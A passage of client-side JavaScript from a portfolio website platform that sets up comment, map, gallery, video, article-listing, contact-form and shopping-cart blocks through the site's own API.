                                    name: $modal.querySelector("#comment_name").value,
                                    email: $modal.querySelector("#comment_email").value,
                                    content: $modal.querySelector("#comment_content").value,
                                    article: window.ARTICLE_ID,
                                    captcha_token: token
                                };
                                axios.post("/api/v1/comments/", data).then((data => {
                                    closeModal(), $modal.querySelector("#comment_name").value = "", $modal.querySelector("#comment_email").value = "", $modal.querySelector("#comment_content").value = "";
                                    var comment = data.data;
                                    document.querySelector(".comments").insertAdjacentHTML("beforeend", `<div class="comment new" id="comment-${comment.id}"><small class="meta">Posted on ${comment.datetime} <a class="comment__permalink" href="${window.location.pathname}#comment-${comment.id}">Permalink</a></small><h3>${comment.name}</h3>${comment.content_display}</div>`), document.querySelector(`#comment-${comment.id}`).scrollIntoView({
                                        behavior: "smooth"
                                    })
                                })).catch((error => {
                                    if (error.response) {
                                        if (400 === error.response.status) {
                                            for (name in errors = error.response.data, errors) $modal.querySelector("[name=" + name + "]").parentElement.classList.add("error"), $modal.querySelector("[name=" + name + "]").parentElement.querySelector(".field__error").innerHTML = errors[name][0];
                                            console.log(error.response.data)
                                        }
                                    } else error.request ? console.log(error.request) : console.log("Error", error.message)
                                }))
                            }))
                        }))
                    }
                }
                block.querySelector("#add-comment") && (block.querySelector("#add-comment").onclick = function() {
                    openModal()
                })
            }))
        }(block)
    }
}), journoPortfolio.registerBlock("Map", {
    initialize: function initialize(block) {
        ! function executeBlockCode(block) {
            journoPortfolio.requireLibrary("mapbox").then((function() {
                var map_wrapper = block.querySelector(".map-wrapper");
                mapboxgl.accessToken = "pk.eyJ1Ijoiam9zaGNhcmxsZXdpcyIsImEiOiJja2w4Y3Mxcm4wb2tlMnBucDQwZWVtNWY3In0.a-z6wpUPJ-tvhwZWREoLuQ";
                var map = new mapboxgl.Map({
                    container: map_wrapper.querySelector(".map"),
                    center: [parseFloat(map_wrapper.dataset.lng), parseFloat(map_wrapper.dataset.lat)],
                    style: "mapbox://styles/mapbox/" + map_wrapper.dataset.style,
                    zoom: Number(map_wrapper.dataset.zoom)
                });
                if (map_wrapper.dataset.marker && "true" === map_wrapper.dataset.marker) {
                    const marker = new mapboxgl.Marker;
                    marker.setLngLat([parseFloat(map_wrapper.dataset.lng), parseFloat(map_wrapper.dataset.lat)]), marker.addTo(map)
                }
            }))
        }(block)
    }
}), journoPortfolio.registerBlock("Instagram", {
    initialize: function initialize(block) {
        ! function executeBlockCode(block) {
            var $modal = block.querySelector(".content-modal");
            block.querySelector("[data-layout=slideshow]") && journoPortfolio.requireLibrary("swiper").then((function() {
                var $slider = block.querySelector(".block-slideshow");
                if (block.querySelectorAll(".swiper-container").length) {
                    var autoplay = !1;
                    $slider.hasAttribute("autoplay") && (autoplay = {
                        delay: Number($slider.dataset.autoplayDelay),
                        disableOnInteraction: !0
                    });
                    var spaceBetween = 30;
                    "none" === $slider.dataset.spaceBetween && (spaceBetween = 0), "small" === $slider.dataset.spaceBetween && (spaceBetween = 15), "medium" === $slider.dataset.spaceBetween && (spaceBetween = 30), "large" === $slider.dataset.spaceBetween && (spaceBetween = 50);
                    var loop = $slider.hasAttribute("loop");
                    $slider.querySelectorAll(".swiper-slide").length < Number($slider.dataset.slidesPerView) && (loop = !1), new Swiper("#block-" + block.dataset.id + " .swiper-container", {
                        direction: "horizontal",
                        loop: loop,
                        autoHeight: !0,
                        autoplay: autoplay,
                        spaceBetween: spaceBetween,
                        slidesPerView: Number($slider.dataset.slidesPerView),
                        paginationClickable: !0,
                        navigation: {
                            nextEl: ".swiper-button-next",
                            prevEl: ".swiper-button-prev"
                        }
                    })
                }
            })), block.querySelectorAll(".gallery-item__img").forEach((function(item) {
                item.onclick = function() {
                    var $root = item.parentElement,
                        $current = item.parentElement;

                    function sliderSlideLeft() {
                        var $prev = $current.previousElementSibling;
                        $prev || ($prev = $root.parentElement.children[$root.parentElement.children.length - 1]), $modal.querySelector("img").classList.add("transition"), setTimeout((() => {
                            $modal.querySelector("img").onload = function() {
                                $modal.querySelector("img").classList.remove("transition")
                            }, $modal.querySelector("img").setAttribute("src", $prev.dataset.imgSrc)
                        }), 300), $modal.querySelector(".caption").innerText = $prev.dataset.caption, $current = $prev
                    }

                    function sliderSlideRight() {
                        var $next = $current.nextElementSibling;
                        $next || ($next = $root.parentElement.children[0]), $modal.querySelector("img").classList.add("transition"), setTimeout((() => {
                            $modal.querySelector("img").onload = function() {
                                $modal.querySelector("img").classList.remove("transition")
                            }, $modal.querySelector("img").setAttribute("src", $next.dataset.imgSrc)
                        }), 300), $modal.querySelector(".caption").innerText = $next.dataset.caption, $current = $next
                    }

                    function sliderClose() {
                        $modal.querySelector(".gallery-modal__close").onclick = null, $modal.classList.remove("open"), document.onkeyup = null, document.body.style.overflow = "initial", document.documentElement.style.overflow = "initial"
                    }
                    $modal && (document.body.style.overflow = "hidden", document.documentElement.style.overflow = "hidden", 0 === $modal.querySelectorAll(".gallery-modal__leftarrow").length && ($modal.insertAdjacentHTML("beforeend", '<a class="gallery-modal__leftarrow">&#x2190;</a>'), $modal.insertAdjacentHTML("beforeend", '<a class="gallery-modal__rightarrow">&#x2192;</a>'), $modal.insertAdjacentHTML("beforeend", '<div class="gallery-modal__close">Close <span>✕</span></div>')), document.body.appendChild($modal), $modal.clientHeight, $modal.classList.add("open"), $modal.removeAttribute("hidden"), $modal.querySelector("img").setAttribute("src", $root.dataset.imgSrc), $modal.querySelector(".caption").innerText = $root.dataset.caption, $modal.querySelector(".gallery-modal__close").onclick = sliderClose, $modal.querySelector(".gallery-modal__leftarrow").onclick = sliderSlideLeft, $modal.querySelector(".gallery-modal__rightarrow").onclick = sliderSlideRight, document.onkeyup = function(event) {
                        switch (event.key) {
                            case "Left":
                            case "ArrowLeft":
                                sliderSlideLeft();
                                break;
                            case "Right":
                            case "ArrowRight":
                                sliderSlideRight();
                                break;
                            case "Esc":
                            case "Escape":
                                sliderClose()
                        }
                    })
                }
            }))
        }(block)
    }
}), journoPortfolio.registerBlock("Video", {
    initialize: function initialize(block) {
        ! function executeBlockCode(block) {
            journoPortfolio.requireLibrary("mux-player").then((function() {}))
        }()
    }
}), journoPortfolio.registerBlock("Video Legacy", {
    initialize: function initialize(block) {
        ! function executeBlockCode(block) {
            journoPortfolio.requireLibrary("reframe").then((function() {
                block.querySelector("iframe") && reframe(block.querySelector("iframe"))
            }))
        }(block)
    }
}), journoPortfolio.registerBlock("Product Page", {
    initialize: function initialize(block) {
        ! function executeBlockCode(block) {
            block.querySelector(".product__select") && block.querySelector(".product__select").addEventListener("change", (function(event) {
                var value = block.querySelector(".product__select").value,
                    price = block.querySelector(".product__select").selectedOptions[0].dataset.price;
                document.querySelector("[data-cart-add]").dataset.variant = value, document.querySelector(["[data-price-display]"]).innerText = price
            })), block.querySelector("[data-cart-add]") && (block.querySelector("[data-cart-add]").onclick = function(event) {
                event.preventDefault(), journoPortfolio.cart.addToCart(block.querySelector("[data-cart-add]").dataset.variant)
            })
        }(block)
    }
}), journoPortfolio.registerBlock("Audio", {
    initialize: function initialize(block) {
        ! function executeBlockCode(block) {
            journoPortfolio.requireLibrary("mux-player").then((function() {}))
        }()
    }
}), journoPortfolio.registerBlock("Articles", {
    initialize: function initialize(block) {
        ! function executeBlockCode(block) {
            var mySwiper, $block = block,
                $articleBlock = $block.children[0],
                $autoloader = $block.querySelector(".autoloader"),
                $inputSearch = $block.querySelector("input.search"),
                $selectPublication = $block.querySelector(".publication-select"),
                $selectTags = $block.querySelector(".tags-select"),
                $selectOrder = $block.querySelector(".order-select"),
                loading = !1,
                $masonry = $block.querySelector(".masonry"),
                $modal = $block.querySelector(".text-modal"),
                $galleryModal = block.querySelector(".gallery-modal");
            $block.querySelector("[data-layout=slideshow]") && journoPortfolio.requireLibrary("swiper").then((function() {
                if (block.querySelectorAll(".swiper-container").length) {
                    var autoplay = !1;
                    $articleBlock.hasAttribute("autoplay") && (autoplay = {
                        delay: Number($articleBlock.dataset.autoplayDelay),
                        disableOnInteraction: !0
                    });
                    var spaceBetween = 30;
                    "none" === $articleBlock.dataset.gutter && (spaceBetween = 0), "small" === $articleBlock.dataset.gutter && (spaceBetween = 15), "medium" === $articleBlock.dataset.gutter && (spaceBetween = 30), "large" === $articleBlock.dataset.gutter && (spaceBetween = 50);
                    var loop = $articleBlock.hasAttribute("loop");
                    $articleBlock.querySelectorAll("article").length < Number($articleBlock.dataset.slidesPerView) && (loop = !1);
                    var slidesPerView = Number($articleBlock.dataset.slidesPerView);
                    window.innerWidth < 700 && (slidesPerView = 1), mySwiper = new Swiper("#block-" + block.dataset.id + " .swiper-container", {
                        direction: "horizontal",
                        loop: loop,
                        autoHeight: !1,
                        autoplay: autoplay,
                        spaceBetween: spaceBetween,
                        slidesPerView: slidesPerView,
                        paginationClickable: !0,
                        navigation: {
                            nextEl: ".swiper-button-next",
                            prevEl: ".swiper-button-prev"
                        }
                    })
                }
            })), $block.querySelector(".filters-show") && ($block.querySelector(".filters-show").onclick = function() {
                $block.querySelector(".filters-show").nextElementSibling.classList.toggle("open")
            });
            var GUTTERS = {
                none: 0,
                small: 15,
                medium: 30,
                large: 50
            };

            function COLUMNS_TARGET(cols) {
                if (window.innerWidth < 600) return $articleBlock.offsetWidth - 100;
                var width = $articleBlock.offsetWidth - (Number(cols) - 1) * GUTTERS[$articleBlock.dataset.gutter];
                return Math.max(width / Number(cols), 200)
            }

            function openGallery(article) {
                var $root = article.parentElement,
                    $current = article;

                function sliderSlideLeft() {
                    if ($block.querySelector("[data-layout=slideshow]"))
                        if ($current.parentElement.previousElementSibling) var $prev = $current.parentElement.previousElementSibling.firstElementChild;
                        else var $sliderRoot = $current.parentElement.parentElement,
                            $prev = $sliderRoot.children[$sliderRoot.children.length - 1].firstElementChild;
                    else($prev = $current.previousElementSibling) || ($prev = $root.children[$root.children.length - 1]);
                    $galleryModal.querySelector("img").classList.add("transition"), setTimeout((() => {
                        $galleryModal.querySelector("img").onload = function() {
                            $galleryModal.querySelector("img").classList.remove("transition")
                        }, $galleryModal.querySelector("img").setAttribute("src", $prev.dataset.imgSrc)
                    }), 300), $prev.querySelector("[data-caption]") ? $galleryModal.querySelector(".caption").innerHTML = $prev.querySelector("[data-caption]").innerHTML : $galleryModal.querySelector(".caption").innerHTML = "", $current = $prev
                }

                function sliderSlideRight() {
                    if ($block.querySelector("[data-layout=slideshow]"))
                        if ($current.parentElement.nextElementSibling) var $next = $current.parentElement.nextElementSibling.firstElementChild;
                        else var $next = $current.parentElement.parentElement.children[0].firstElementChild;
                    else($next = $current.nextElementSibling) || ($next = $root.children[0]);
                    $galleryModal.querySelector("img").classList.add("transition"), setTimeout((() => {
                        $galleryModal.querySelector("img").onload = function() {
                            $galleryModal.querySelector("img").classList.remove("transition")
                        }, $galleryModal.querySelector("img").setAttribute("src", $next.dataset.imgSrc)
                    }), 300), $next.querySelector("[data-caption]") ? $galleryModal.querySelector(".caption").innerHTML = $next.querySelector("[data-caption]").innerHTML : $galleryModal.querySelector(".caption").innerHTML = "", $current = $next
                }

                function sliderClose() {
                    $galleryModal.querySelector(".gallery-modal__close").onclick = null, $galleryModal.classList.remove("open"), document.onkeyup = null, document.body.style.overflow = "initial", document.documentElement.style.overflow = "initial"
                }
                mySwiper && (mySwiper.autoplay.pause(), console.log(mySwiper.autoplay.paused)), $galleryModal && (document.body.style.overflow = "hidden", document.documentElement.style.overflow = "hidden", 0 === $galleryModal.querySelectorAll(".gallery-modal__leftarrow").length && ($galleryModal.insertAdjacentHTML("beforeend", '<a class="gallery-modal__leftarrow">&#x2190;</a>'), $galleryModal.insertAdjacentHTML("beforeend", '<a class="gallery-modal__rightarrow">&#x2192;</a>'), $galleryModal.insertAdjacentHTML("beforeend", '<div class="gallery-modal__close">Close <span>✕</span></div>')), document.body.appendChild($galleryModal), $galleryModal.clientHeight, $galleryModal.classList.add("open"), $galleryModal.removeAttribute("hidden"), $galleryModal.querySelector("img").setAttribute("src", article.dataset.imgSrc), article.querySelector("[data-caption]") ? $galleryModal.querySelector(".caption").innerHTML = article.querySelector("[data-caption]").innerHTML : $galleryModal.querySelector(".caption").innerHTML = "", $galleryModal.querySelector(".gallery-modal__close").onclick = sliderClose, $galleryModal.querySelector(".gallery-modal__leftarrow").onclick = sliderSlideLeft, $galleryModal.querySelector(".gallery-modal__rightarrow").onclick = sliderSlideRight, document.onkeyup = function(event) {
                    switch (event.key) {
                        case "Left":
                        case "ArrowLeft":
                            sliderSlideLeft();
                            break;
                        case "Right":
                        case "ArrowRight":
                            sliderSlideRight();
                            break;
                        case "Esc":
                        case "Escape":
                            sliderClose()
                    }
                })
            }

            function bindArticles() {
                $articleBlock.querySelectorAll("article").forEach((function($article) {
                    $article.querySelector(".article__inner") && ($article.querySelector(".article__inner").onclick = function(event) {
                        return journoPortfolio.articleClick($article.dataset.id).then((function() {})), $article.classList.contains("article--modal") && !$article.querySelector("[data-caption]") ? (event.preventDefault(), openModal($article.dataset.id), !1) : "image" === $article.dataset.type ? (event.preventDefault(), openGallery($article), !1) : void 0
                    })
                }))
            }

            function reloadMacy() {
                $masonry ? ($masonry.classList.remove("animate"), window.MASONRY || (window.MASONRY = {}), document.querySelector(`#block-${block.dataset.id} .masonry`) && (window.MASONRY[Number(block.dataset.id)] = new MiniMasonry({
                    baseWidth: COLUMNS_TARGET($articleBlock.dataset.columns),
                    container: `#block-${block.dataset.id} .masonry`,
                    surroundingGutter: !1,
                    gutter: GUTTERS[$articleBlock.dataset.gutter]
                }), block.querySelectorAll(".dragging").length > 0 ? $masonry.classList.add("animate") : setTimeout((function() {
                    $masonry.classList.add("animate")
                }), 500)), bindArticles()) : bindArticles()
            }

            function autoLoaderClick(e) {
                loadNextPage()
            }

            function loadNextPage() {
                $autoloader.innerText = "Loading more...", loadArticles($articleBlock.querySelectorAll("article").length)
            }

            function escPress(e) {
                "Escape" === e.key && closeModal()
            }

            function closePress(e) {
                closeModal()
            }

            function clickBg(e) {
                e.target === this && closeModal()
            }

            function closeModal() {
                document.documentElement.classList.remove("modal-open"), $modal.querySelector(".content-modal__content").innerHTML = "", $modal.classList.remove("open"), document.removeEventListener("keyup", escPress)
            }

            function openModal(article_id) {
                $modal = $modal.cloneNode(!0), document.body.appendChild($modal), document.documentElement.classList.add("modal-open"), $modal.querySelector(".loading").style.display = "block", $modal.clientHeight, $modal.classList.add("open"), $modal.removeAttribute("hidden"), fetch("/api/v1/articles/" + article_id + "/?template&language=" + document.documentElement.getAttribute("lang")).then((response => response.text())).then((data => {
                    if ($modal.querySelector(".content-modal__content").innerHTML = data, $modal.querySelectorAll("mux-player").length > 0 && journoPortfolio.requireLibrary("mux-player").then((function() {})), $modal.querySelector(".loading").style.display = "none", $modal.querySelector("script")) {
                        var script = document.createElement("script");
                        script.onload = function() {}, script.src = $modal.querySelector("script").src, document.head.appendChild(script)
                    }
                    window.instgrm && window.instgrm.Embeds && window.instgrm.Embeds.process(), $modal.querySelector("iframe") && !$modal.querySelector("iframe[data-nofitvids]") && -1 === $modal.querySelector("iframe").src.indexOf(".soundcloud.com") && -1 === $modal.querySelector("iframe").src.indexOf(".reverbnation.com") && -1 === $modal.querySelector("iframe").src.indexOf(".instagram.com") && -1 === $modal.querySelector("iframe").src.indexOf(".facebook.com") && -1 === $modal.querySelector("iframe").src.indexOf(".twitter.com") && journoPortfolio.requireLibrary("reframe").then((function() {
                        reframe($modal.querySelector("iframe"), 80)
                    }))
                })), $modal.onclick = clickBg, $modal.querySelector(".close").onclick = closePress, document.addEventListener("keyup", escPress)
            }

            function loadArticles(start_from) {
                if (!loading) {
                    loading = !0;
                    var searchVal = "",
                        publicationVal = "all",
                        tagsVal = "all",
                        orderVal = $articleBlock.dataset.defaultOrder;
                    "number" != typeof start_from && (start_from = 0), $inputSearch && (searchVal = $inputSearch.value), $selectOrder && (orderVal = $selectOrder.value), $selectPublication && (publicationVal = $selectPublication.value), $selectTags && (tagsVal = $selectTags.value), fetch("/api/v1/articles/?block=" + block.dataset.id + "&order=" + orderVal + "&publication=" + publicationVal + "&tag=" + encodeURIComponent(tagsVal) + "&start=" + start_from + "&search=" + encodeURIComponent(searchVal) + "&language=" + document.documentElement.getAttribute("lang")).then((response => response.text())).then((data => {
                        loading = !1;
                        var countBefore = block.querySelectorAll(".articles__wrapper article").length;
                        0 === start_from ? (countBefore = 0, block.querySelector(".articles__wrapper").innerHTML = data) : block.querySelector(".articles__wrapper").insertAdjacentHTML("beforeend", data), journoPortfolio.newContent(block.querySelector(".articles__wrapper"));
                        var countAfter = block.querySelectorAll(".articles__wrapper article").length;
                        $autoloader && ("" == data || countAfter - countBefore < 12 ? $autoloader.style.display = "none" : ($autoloader.style.display = "block", $autoloader.innerText = "Load More")), reloadMacy(), block.dispatchEvent(new Event("ArticleAPILoad"))
                    }))
                }
            }
            if ("IntersectionObserver" in window && window.top == window.self && (window.loadMoreObserver ? $block.dataset.id in window.loadMoreObserver && window.loadMoreObserver[$block.dataset.id].disconnect() : window.loadMoreObserver = {}, window.loadMoreObserver[$block.dataset.id] = new IntersectionObserver((function(entries, observer) {
                    entries.forEach((function(entry) {
                        entry.isIntersecting && autoLoaderClick()
                    }))
                }), {
                    rootMargin: "0px 0px 300px 0px"
                })), $autoloader && ($autoloader.onclick = autoLoaderClick, null === $block.nextElementSibling && null === $block.parentNode.parentNode.parentNode.nextElementSibling && ($block.parentNode.parentNode.parentNode.parentNode.classList.contains("widget-render") || "IntersectionObserver" in window && window.top == window.self && (window.loadMoreObserver[$block.dataset.id].unobserve($autoloader), window.loadMoreObserver[$block.dataset.id].observe($autoloader)))), $inputSearch && ($inputSearch.onblur = loadArticles, $inputSearch.onkeyup = function(event) {
                    13 === event.keyCode && (event.preventDefault(), loadArticles())
                }), $selectOrder && ($selectOrder.onchange = loadArticles), $selectTags && ($selectTags.onchange = loadArticles, isNaN($block.dataset.id) || fetch("/api/v1/tags/?block=" + $block.dataset.id).then((response => response.json())).then((data => {
                    $selectTags.innerHTML = '<option value="all" selected>All Tags</option>';
                    for (var i = 0; i < data.length; i++) {
                        var tag = data[i],
                            option = document.createElement("option");
                        option.text = tag, option.value = tag, $selectTags.appendChild(option)
                    }
                }))), $selectPublication && ($selectPublication.onchange = loadArticles, !isNaN($block.dataset.id))) {
                var $emptyOption = $selectPublication.querySelectorAll("option")[0];
                fetch("/api/v1/publications/?block=" + $block.dataset.id).then((response => response.json())).then((data => {
                    $selectPublication.innerHTML = "", $selectPublication.appendChild($emptyOption);
                    for (var i = 0; i < data.length; i++) {
                        var pub = data[i],
                            option = document.createElement("option");
                        option.text = pub.name, option.value = pub.id, $selectPublication.appendChild(option)
                    }
                }))
            }
            reloadMacy(), setTimeout((function() {
                reloadMacy()
            }), 500)
        }(block)
    }
}), journoPortfolio.registerBlock("Navigation Sidebar", {
    initialize: function initialize(block) {
        ! function executeBlockCode(block) {
            block.querySelectorAll(".menu ul li a").forEach((function(item) {
                item.onclick = function(e) {
                    var href = item.getAttribute("href");
                    if (href.startsWith("/#")) {
                        e.preventDefault();
                        var y = document.getElementById(href.replace("/#", "")).getBoundingClientRect().top + window.pageYOffset;
                        window.scrollTo({
                            top: y,
                            behavior: "smooth"
                        })
                    }
                }
            })), journoPortfolio.cart.init()
        }(block)
    }
}), journoPortfolio.registerBlock("Contact Form", {
    initialize: function initialize(block) {
        ! function executeBlockCode(block) {
            var $modal = block.querySelector(".content-modal");
            if ($modal) var $form = $modal;
            else $form = block;

            function escPress(e) {
                "Escape" === e.key && closeModal()
            }

            function closePress(e) {
                closeModal()
            }

            function clickBg(e) {
                e.target === this && closeModal()
            }

            function closeModal() {
                $modal.classList.remove("open"), document.removeEventListener("keyup", escPress)
            }

            function openModal() {
                document.body.appendChild($modal), $modal.clientHeight, $modal.classList.add("open"), $modal.removeAttribute("hidden"), $modal.onclick = clickBg, $modal.querySelector(".close").onclick = closePress, document.addEventListener("keyup", escPress)
            }
            block.querySelector(".open-contact-form") && (block.querySelector(".open-contact-form").onclick = function() {
                openModal()
            }), Promise.all([journoPortfolio.requireLibrary("grecaptcha"), journoPortfolio.requireLibrary("axios")]).then((function() {
                var loading = !1;
                block.querySelector("form") && (block.querySelector("form").onsubmit = function(e) {
                    e.preventDefault(), loading || (loading = !0, $form.querySelectorAll("input,textarea").forEach((function($el) {
                        $el.parentElement.classList.remove("error")
                    })), $form.querySelector("button").classList.add("saving"), grecaptcha.ready((function() {
                        grecaptcha.execute(window.PORTFOLIO_CAPTCHA_PUBLIC_KEY, {
                            action: "submit"
                        }).then((function(token) {
                            var data = {
                                email: $form.querySelector("input[name=email]").value,
                                block: Number(block.dataset.id),
                                message: $form.querySelector("textarea[name=message]").value,
                                captcha_token: token
                            };
                            $form.querySelector("input[name=name]") && (data.name = $form.querySelector("input[name=name]").value), $form.querySelector("input[name=phone]") && (data.phone = $form.querySelector("input[name=phone]").value), axios.post("/api/v1/message/", data).then((function(data) {
                                var $form1 = $form.querySelector("form"),
                                    $success = $form.querySelector(".success-message");
                                $success.style.height = $form1.offsetHeight + "px", $success.style.width = $form1.offsetWidth + "px", $success.style.display = "block", $form1.remove()
                            })).catch((function(error) {
                                if (error.response) {
                                    if (400 === error.response.status) {
                                        for (name in errors = error.response.data, errors) $form.querySelector("[name=" + name + "]").parentElement.classList.add("error"), $form.querySelector("[name=" + name + "]").parentElement.querySelector(".field__error").innerHTML = errors[name][0];
                                        console.log(error.response.data)
                                    }
                                } else error.request ? console.log(error.request) : console.log("Error", error.message)
                            })).finally((function() {
                                loading = !1, $form.querySelector("button") && $form.querySelector("button").classList.remove("saving")
                            }))
                        }))
                    })))
                })
            }))
        }(block)
    }
}), journoPortfolio.init(), journoPortfolio.cart = function() {
    var cartData = null,
        hasStore = !1,
        $cart = document.querySelector("#cart"),
        $modal = document.querySelector(".cart-modal");

    function escPress(e) {
        "Escape" === e.key && closeModal()
    }

    function closePress(e) {
        closeModal()
    }

    function clickBg(e) {
        e.target === this && closeModal()
    }

    function closeModal() {
        $modal.style.display = "none", document.removeEventListener("keyup", escPress)
    }

    function updateShippingAddressState() {
        if (document.getElementById("requires-shipping-country").value in cartData.countries_needing_states) {
            var currentValue = document.getElementById("requires-shipping-state").value;
            document.getElementById("requires-shipping-state-field").style.display = "block", document.getElementById("requires-shipping-state").innerHTML = "";
            for (var options = cartData.countries_needing_states[document.getElementById("requires-shipping-country").value], i = 0; i < options.length; i++) {
                var option = document.createElement("option");
                option.text = options[i].name, option.value = options[i].value, document.getElementById("requires-shipping-state").appendChild(option)
            }
            currentValue && (document.getElementById("requires-shipping-state").value = currentValue)
        } else document.getElementById("requires-shipping-state-field").style.display = "none", document.getElementById("requires-shipping-state").innerHTML = "", document.getElementById("requires-shipping-state").value = null
    }

    function renableCheckoutButtons() {
        document.querySelector(".cart-modal__inner .button").classList.remove("saving"), document.querySelector("#cart .button").classList.remove("saving")
    }

    function disableCheckoutButtons() {
        document.querySelector(".cart-modal__inner .button") && document.querySelector(".cart-modal__inner .button").classList.add("saving"), document.querySelector("#cart .button") && document.querySelector("#cart .button").classList.add("saving")
    }

    function doCheckout() {
        disableCheckoutButtons();
        var countryValue = document.getElementById("requires-shipping-country").value,
            stateValue = document.getElementById("requires-shipping-state").value;
        axios.post("/api/v1/cart/checkout/", {
            url: window.location.pathname,
            country: countryValue,
            state: stateValue
        }).then((function(result) {
            result.data && result.data.url ? window.location = result.data.url : renableCheckoutButtons()
        })).catch((function(error) {
            return closeModal(), renableCheckoutButtons(), error.response && 400 == error.response.status && error.response.data && error.response.data.error ? loadCart(error.response.data.error) : loadCart("other")
        }))
    }

    function cartCheckoutClick() {
        document.querySelector(".cart-modal__inner .button").classList.contains("saving") || doCheckout()
    }

    function _addToCart(variant_id) {
        disableCheckoutButtons(), axios.post("/api/v1/cart/add/", {
            variant: variant_id
        }).then((function(result) {
            cartData = result.data, renderCart(!1), renableCheckoutButtons()
        })).catch((function(error) {
            return console.log(error), renableCheckoutButtons(), error.response && 400 == error.response.status && error.response.data && error.response.data.error ? loadCart(error.response.data.error) : loadCart("other")
        }))
    }

    function bindCartEvents() {
        document.querySelectorAll("#cart .minus-btn").forEach(($el => {
            $el.onclick = function(e) {
                var input = $el.parentElement.querySelector("input");
                Number(input.value) > 0 && (input.value = Number(input.value) - 1),
                    function _removeFromCart(variant_id) {
                        disableCheckoutButtons(), axios.post("/api/v1/cart/remove/", {
                            variant: variant_id
                        }).then((function(result) {
                            cartData = result.data, renderCart(!1), renableCheckoutButtons()
                        })).catch((function(error) {
                            return console.log(error), renableCheckoutButtons(), error.response && 400 == error.response.status && error.response.data && error.response.data.error ? loadCart(error.response.data.error) : loadCart("other")
                        }))
                    }($el.parentElement.parentElement.parentElement.dataset.variant)
            }
        })), document.querySelectorAll("#cart .plus-btn").forEach(($el => {
            $el.onclick = function(e) {
                var input = $el.parentElement.querySelector("input");
                input.value = Number(input.value) + 1, _addToCart($el.parentElement.parentElement.parentElement.dataset.variant)
            }
        }))
    }

    function renderLineItem(line_item) {
        var $product = document.getElementById("cart-line-item-template").cloneNode(!0);
        if ($product.removeAttribute("id"), $product.dataset.variant = line_item.variant.id, "Default" === line_item.variant.name ? $product.querySelector(".variant").style.display = "none" : ($product.querySelector(".variant").style.display = "inline-block", $product.querySelector("[data-variant-name]").innerText = line_item.variant.name), line_item.variant.product.primary_image) {
            var img = document.createElement("img");
            img.setAttribute("src", line_item.variant.product.primary_image.small), $product.querySelector(".img-placeholder").parentNode.insertBefore(img, $product.querySelector(".img-placeholder").nextSibling), $product.querySelector(".img-placeholder").remove()
        } else $product.querySelector("img").remove();
        return $product.querySelector("h3").innerText = line_item.variant.product.name, $product.querySelector(".price").innerText = cartData.currency_symbol + line_item.variant.price + " each", $product.querySelector(".total").innerText = cartData.currency_symbol + line_item.total, $product.querySelector(".quantity input").value = line_item.quantity, $product
    }

    function renderCart(error) {
        document.querySelector("#cart .v-spinner").style.display = "none", document.querySelectorAll("[data-cart-count]").forEach(($el => {
            $el.innerText = function getCartCount(argument) {
                for (var qty = 0, i = 0; i < cartData.line_items.length; i++) qty += cartData.line_items[i].quantity;
                return qty
            }()
        })), 0 == cartData.line_items.length ? document.querySelector(".cart__empty").style.display = "block" : document.querySelector(".cart__empty").style.display = "none";
        var cart_items = document.querySelector("#cart .cart__items");
        cart_items.innerHTML = "";
        for (var i = 0; i < cartData.line_items.length; i++) {
            var product = renderLineItem(cartData.line_items[i]);
            cart_items.appendChild(product)
        }
        document.querySelector(".cart__bottom .price").innerText = cartData.currency_symbol + cartData.total,
            function renderShippingMessage() {
                document.querySelector(".shipping-taxes").style.display = "none", document.querySelector(".shipping").style.display = "none", document.querySelector(".taxes").style.display = "none", cartData.taxes_enabled && cartData.requires_shipping ? document.querySelector(".shipping-taxes").style.display = "block" : cartData.requires_shipping ? document.querySelector(".shipping").style.display = "block" : cartData.taxes_enabled && (document.querySelector(".taxes").style.display = "block")
            }(),
            function renderCartError(error) {
                if (document.querySelectorAll(".cart__error").forEach((function($el) {
                        $el.style.display = "none"
                    })), error) try {
                    document.querySelector(".cart__error-" + error) ? document.querySelector(".cart__error-" + error).style.display = "block" : (document.querySelector(".cart__error-custom").style.display = "block", document.querySelector(".cart__error-custom span").innerText = error)
                } catch (error1) {
                    document.querySelector(".cart__error-custom").style.display = "block", document.querySelector(".cart__error-custom span").innerText = error
                }
            }(error || cartData.error), bindCartEvents()
    }

    function loadCart(error) {
        axios.get("/api/v1/cart/").then((function(result) {
            cartData = result.data, renderCart(error)
        }))
    }

    function outsideClickListener(event) {
        $modal.contains(event.target) || "cartAdd" in event.target.dataset || $cart.contains(event.target) || !$cart.classList.contains("open") || closeCart()
    }

    function openCart() {
        $cart.classList.contains("open") || ($cart.classList.add("open"), setTimeout((function() {
            document.querySelector("#cart #close").addEventListener("click", closeCart), document.addEventListener("click", outsideClickListener)
        }), 50))
    }

    function closeCart() {
        $cart.classList.remove("open"), document.querySelector("#cart #close").removeEventListener("click", closeCart), document.removeEventListener("click", outsideClickListener)
    }
    return {
        checkoutProduct: function checkoutProduct(variant_id) {
            hasStore || alert("This site does not have checkout enabled. If you are the site owner you can enable the cart and checkout under 'Settings' -> 'Store'"), axios.post("/api/v1/cart/add/", {
                variant: variant_id
            }).then((function(result) {
                cartData = result.data, renderCart(!1), doCheckout()
            })).catch((function(error) {
                return console.log(error), openCart(), renableCheckoutButtons(), error.response && 400 == error.response.status && error.response.data && error.response.data.error ? loadCart(error.response.data.error) : loadCart("other")
            }))
        },
        addToCart: function addToCart(variant_id) {
            hasStore || alert("This site does not have checkout enabled. If you are the site owner you can enable the cart and checkout under 'Settings' -> 'Store'"), _addToCart(variant_id), openCart()
        },
        init: function init() {
            $cart = document.querySelector("#cart"), $modal = document.querySelector(".cart-modal"), $cart && (hasStore = !0, journoPortfolio.requireLibrary("axios").then((function() {
                loadCart(null)
            }))), document.querySelectorAll("[data-cart-open]").forEach((function($el) {
                $el.onclick = function() {
                    openCart()
                }
            })), document.querySelectorAll("[data-checkout]").forEach(($el => {
                $el.onclick = function(e) {
                    e.preventDefault(), $el.classList.contains("saving") || cartData && (cartData.requires_country ? function openModal() {
                        $modal.style.display = "flex", document.getElementById("requires-shipping-country").innerHTML = "";
                        for (var i = 0; i < cartData.countries.length; i++) {
                            var option = document.createElement("option");
                            option.text = cartData.countries[i].name, option.value = cartData.countries[i].value, cartData.countries[i].value === cartData.shipping_address_country && (option.selected = !0), document.getElementById("requires-shipping-country").appendChild(option)
                        }
                        updateShippingAddressState(), $modal.onclick = clickBg, document.querySelector(".cart-modal__inner .button").onclick = cartCheckoutClick, document.getElementById("requires-shipping-country").onchange = updateShippingAddressState, document.querySelector(".cart-modal .close").onclick = closePress, document.addEventListener("keyup", escPress)
                    }() : doCheckout())
                }
            }))
        }
